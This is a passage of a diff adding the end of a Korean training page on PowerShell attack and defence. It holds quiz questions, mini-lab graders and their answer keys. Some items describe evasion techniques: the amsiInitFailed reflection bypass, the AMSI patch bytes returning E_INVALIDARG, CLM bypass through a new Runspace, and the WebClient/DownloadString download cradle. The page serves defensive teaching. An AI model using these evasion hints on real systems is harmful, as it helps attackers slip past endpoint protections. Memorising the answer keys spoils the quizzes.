+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q3. .NET Reflection 기반 AMSI 우회에서 변조하는 필드 이름은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q3" value="1" class="mr-3"> amsiInitFailed</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q3" value="2" class="mr-3"> amsiContext</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q3" value="3" class="mr-3"> scanResult</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="2">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q4. PowerShell 다운그레이드 공격을 방지하는 가장 효과적인 방법은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q4" value="1" class="mr-3"> ExecutionPolicy를 Restricted로 설정</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q4" value="2" class="mr-3"> .NET Framework 2.0/3.5를 완전 제거</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q4" value="3" class="mr-3"> Windows Defender 실시간 보호 활성화</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="3">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q5. WMI 이벤트 구독 백도어의 탐지에 가장 적합한 이벤트 ID는?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q5" value="1" class="mr-3"> Sysmon EID 1</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q5" value="2" class="mr-3"> PowerShell EID 4104</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q5" value="3" class="mr-3"> WMI-Activity EID 5861</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="1">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q6. CLM 우회에서 새 Runspace를 생성하는 것이 효과적인 이유는?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q6" value="1" class="mr-3"> CLM 정책이 현재 Runspace에만 적용되기 때문</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q6" value="2" class="mr-3"> 새 Runspace가 관리자 권한으로 실행되기 때문</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q6" value="3" class="mr-3"> Runspace가 AMSI를 자동 비활성화하기 때문</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="2">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q7. Volatility에서 PowerShell 프로세스의 커맨드라인 인자를 확인하는 플러그인은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q7" value="1" class="mr-3"> windows.pslist</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q7" value="2" class="mr-3"> windows.cmdline</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q7" value="3" class="mr-3"> windows.dlllist</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="1">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q8. YARA 규칙에서 <code>nocase</code> 키워드의 역할은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q8" value="1" class="mr-3"> 대소문자를 구분하지 않고 매칭</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q8" value="2" class="mr-3"> 해당 문자열이 없을 때 매칭</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q8" value="3" class="mr-3"> 와일드카드 매칭 활성화</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="3">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q9. 인시던트 대응에서 감염 호스트 격리(Containment) 직후에 수행해야 할 단계는?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q9" value="1" class="mr-3"> 시스템 재이미징</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q9" value="2" class="mr-3"> 사후 분석 보고서 작성</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q9" value="3" class="mr-3"> 증거 수집 (메모리 덤프, 로그 백업)</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="2">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q10. AppLocker보다 CLM 우회에 더 효과적으로 대응할 수 있는 기술은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q10" value="1" class="mr-3"> Windows Firewall</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q10" value="2" class="mr-3"> WDAC (Windows Defender Application Control)</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q10" value="3" class="mr-3"> BitLocker 디스크 암호화</label>
+                </div>
+            </div>
+            <button onclick="checkQuiz()" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-6 rounded font-mono transition shadow-sm border border-red-400">정답 확인</button>
+        </div>
+        <div id="quiz-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
+    </div>
+</section>
+
+<!-- Final CTA -->
+<div class="pt-12 pb-8 text-center border-t border-red-400/30 mt-16">
+    <div class="inline-block bg-gradient-to-r from-red-500/10 to-amber-500/10 text-red-700 dark:text-red-400 px-4 py-1 rounded-full font-bold text-sm mb-4 border border-red-400">🏆 All Courses Completed!</div>
+    <h2 class="text-3xl font-extrabold text-[#1e293b] dark:text-white mb-4">T1059.001 고급 과정 12챕터 완료!</h2>
+    <p class="text-cgray dark:text-slate-400 mb-8 max-w-xl mx-auto">AMSI 내부 구조부터 메모리 포렌식, YARA/Sigma 탐지, 인시던트 대응까지 — 12챕터에 걸친 PowerShell 공격과 방어의 전체를 학습했습니다. 이제 <strong>실전 시뮬레이터</strong>에서 직접 체험하세요.</p>
+    <button onclick="goToLab()" class="inline-flex items-center gap-3 bg-gradient-to-r from-red-500 to-amber-600 text-white px-8 py-4 rounded-xl font-bold shadow-lg transform transition hover:-translate-y-1 hover:shadow-2xl"><span class="text-2xl">🚀</span><span>실전 시뮬레이터 환경으로 이동하기</span></button>
+</div>
+
+</div>
+</main>
+</div>
+<script>
+function go(id){var el=document.getElementById(id);if(el)document.getElementById('main-scroll').scrollTo({top:el.offsetTop-40,behavior:'smooth'})}
+function goToLab(){window.location.href='/lab/desktop/T1059.001'}
+function goToDashboard(){window.location.replace('/')}
+function toggleTheme(){var h=document.documentElement,i=document.getElementById('theme-icon');if(h.classList.contains('dark')){h.classList.remove('dark');h.classList.add('light');i.textContent='☀️'}else{h.classList.remove('light');h.classList.add('dark');i.textContent='🌙'}}
+var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){entry.target.classList.remove('opacity-0','translate-y-10');entry.target.classList.add('opacity-100','translate-y-0');var id=entry.target.getAttribute('id');document.querySelectorAll('.nav-item').forEach(function(nav){nav.classList.remove('active');if(nav.getAttribute('data-target')===id)nav.classList.add('active')})}})},{root:document.getElementById('main-scroll'),rootMargin:'0px 0px -40% 0px',threshold:0.1});
+document.querySelectorAll('.section-observe').forEach(function(s){observer.observe(s)});
+
+// ── Mini Lab 1: AMSI 패치 바이트 분석 ──
+function checkLab1(){
+    var answers={q1:'b',q2:'c',q3:'c',q4:'b'};
+    var correct=0;
+    for(var k in answers){var v=document.getElementById('lab1-'+k).value;if(v===answers[k])correct++;}
+    var r=document.getElementById('lab1-result');r.classList.remove('hidden');
+    if(correct===4){r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400 border border-green-400';r.textContent='🎯 4/4 완벽! AMSI 패치 바이트를 정확히 해석했습니다.';}
+    else{r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 border border-red-400';r.textContent='❌ '+correct+'/4 — B8=mov eax, 0x80070057=E_INVALIDARG, C3=ret, 효과=스캔 없이 실패 반환';}
+}
+function resetLab1(){for(var i=1;i<=4;i++){var el=document.getElementById('lab1-q'+i);if(el)el.selectedIndex=0;}var r=document.getElementById('lab1-result');if(r){r.classList.add('hidden');}}
+
+// ── Mini Lab 2: YARA 규칙 빈칸 채우기 ──
+function checkLab2(){
+    var a=document.getElementById('lab2-a').value.trim().toLowerCase();
+    var b=document.getElementById('lab2-b').value.trim().toLowerCase();
+    var correct=0;
+    if(a.indexOf('webclient')!==-1||a.indexOf('net.webclient')!==-1)correct++;
+    if(b.indexOf('downloadstring')!==-1)correct++;
+    var r=document.getElementById('lab2-result');r.classList.remove('hidden');
+    if(correct===2){r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400 border border-green-400';r.textContent='🎯 2/2 완벽! Net.WebClient와 DownloadString — 다운로드 크래들의 핵심입니다.';}
+    else{r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 border border-red-400';r.textContent='❌ '+correct+'/2 — A: Net.WebClient (또는 WebClient), B: DownloadString';}
+}
+function resetLab2(){document.getElementById('lab2-a').value='';document.getElementById('lab2-b').value='';var r=document.getElementById('lab2-result');if(r)r.classList.add('hidden');}
+
+// ── Mini Lab 3: 매칭 게임 ──
+var matchSelected={left:null,right:null};
+var matchPairs=[];
+function selectMatch(el,side){
+    if(el.classList.contains('correct'))return;
+    var prev=matchSelected[side];
+    if(prev)prev.classList.remove('ring-2','ring-red-400');
+    el.classList.add('ring-2','ring-red-400');
+    matchSelected[side]=el;
+    if(matchSelected.left&&matchSelected.right){
+        var lm=matchSelected.left.getAttribute('data-match');
+        var rm=matchSelected.right.getAttribute('data-match');
+        if(lm===rm){
+            matchSelected.left.classList.add('correct');matchSelected.right.classList.add('correct');
+            matchSelected.left.classList.remove('ring-2','ring-red-400');matchSelected.right.classList.remove('ring-2','ring-red-400');
+            matchPairs.push(lm);
+        }else{
+            matchSelected.left.classList.add('wrong');matchSelected.right.classList.add('wrong');
+            var ml=matchSelected.left,mr=matchSelected.right;
+            setTimeout(function(){ml.classList.remove('wrong','ring-2','ring-red-400');mr.classList.remove('wrong','ring-2','ring-red-400');},800);
+        }
+        matchSelected={left:null,right:null};
+    }
+}
+function checkMatchGame(){
+    var r=document.getElementById('match-result');r.classList.remove('hidden');
+    if(matchPairs.length===4){r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400 border border-green-400';r.textContent='🎯 4/4 완벽! 모든 공격-탐지 쌍을 올바르게 매칭했습니다.';}
+    else{r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-amber-100 dark:bg-amber-900/30 text-amber-700 dark:text-amber-400 border border-amber-400';r.textContent='⏳ '+matchPairs.length+'/4 완료 — 나머지 항목도 매칭해주세요.';}
+}
+function resetMatchGame(){
+    matchPairs=[];matchSelected={left:null,right:null};
+    document.querySelectorAll('.match-btn').forEach(function(b){b.classList.remove('correct','wrong','ring-2','ring-red-400');});
+    var r=document.getElementById('match-result');if(r)r.classList.add('hidden');
+}
+
+// ── Mini Lab 4: IR 워크플로우 순서 ──
+var lab4Order=[];
+function lab4Pick(el){
+    if(el.classList.contains('picked'))return;
+    el.classList.add('picked');el.style.opacity='0.4';el.style.cursor='default';
+    lab4Order.push(parseInt(el.getAttribute('data-order')));
+    var sel=document.getElementById('lab4-selected');
+    sel.textContent=(sel.textContent?sel.textContent+' → ':'')+el.textContent.trim();
+}
+function checkLab4(){
+    if(lab4Order.length<6){alert('6개 항목을 모두 선택해주세요.');return;}
+    var correct=true;
+    for(var i=0;i<6;i++){if(lab4Order[i]!==i+1){correct=false;break;}}
+    var r=document.getElementById('lab4-result');r.classList.remove('hidden');
+    if(correct){r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400 border border-green-400';r.textContent='🎯 완벽한 순서! 탐지→격리→증거수집→분석→제거복구→사후분석';}
+    else{r.className='mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 border border-red-400';r.textContent='❌ 순서가 다릅니다. 정답: 탐지&분류→격리→증거수집→분석→제거&복구→사후분석';}
+}
+function resetLab4(){
+    lab4Order=[];
+    document.getElementById('lab4-selected').textContent='';
+    document.querySelectorAll('.lab4-item').forEach(function(el){el.classList.remove('picked');el.style.opacity='1';el.style.cursor='pointer';});
+    var r=document.getElementById('lab4-result');if(r)r.classList.add('hidden');
+}
+
+// ── Quiz ──
+function checkQuiz(){
+    var total=10,correct=0;
+    for(var i=1;i<=total;i++){
+        var sel=document.querySelector('input[name="q'+i+'"]:checked');
+        if(!sel){alert('모든 문항에 답을 선택해주세요.');return;}
+        if(sel.value===sel.closest('.quiz-q').getAttribute('data-correct'))correct++;
+    }
+    var r=document.getElementById('quiz-result');
+    r.classList.remove('hidden','bg-red-100','text-red-700','bg-green-100','text-green-700','dark:bg-red-900/30','dark:text-red-400','dark:bg-green-900/30','dark:text-green-400');
+    var pct=Math.round((correct/total)*100);
+    if(correct>=9){r.classList.add('bg-gradient-to-r','from-red-100','to-amber-100','dark:from-red-900/30','dark:to-amber-900/30','border','border-red-400','text-red-700','dark:text-red-400');r.innerHTML='🏆 '+correct+'/'+total+' ('+pct+'%) 완벽한 점수! PowerShell 공격과 방어를 마스터했습니다!';}
+    else if(correct>=7){r.classList.add('bg-green-100','border','border-green-400','text-green-700','dark:bg-green-900/30','dark:text-green-400');r.innerHTML='👏 '+correct+'/'+total+' ('+pct+'%) 우수합니다! 틀린 문항만 복습하면 마스터 완료!';}
+    else if(correct>=5){r.classList.add('bg-amber-100','border','border-amber-400','text-amber-700','dark:bg-amber-900/30','dark:text-amber-400');r.innerHTML='💪 '+correct+'/'+total+' ('+pct+'%) 양호합니다. 챕터를 다시 복습해 보세요.';}
+    else{r.classList.add('bg-red-100','border','border-red-400','text-red-700','dark:bg-red-900/30','dark:text-red-400');r.innerHTML='📚 '+correct+'/'+total+' ('+pct+'%) — 챕터 1부터 다시 복습하시길 권장합니다.';}
+}
+
+window.onload=function(){setTimeout(function(){go('ch1')},100)};
+</script>
+<script src="/edu/progress-tracker.js"></script>
+<script src="/edu/breadcrumb.js"></script>
+<script src="/edu/lab-link.js"></script>
+</body>
+</html>
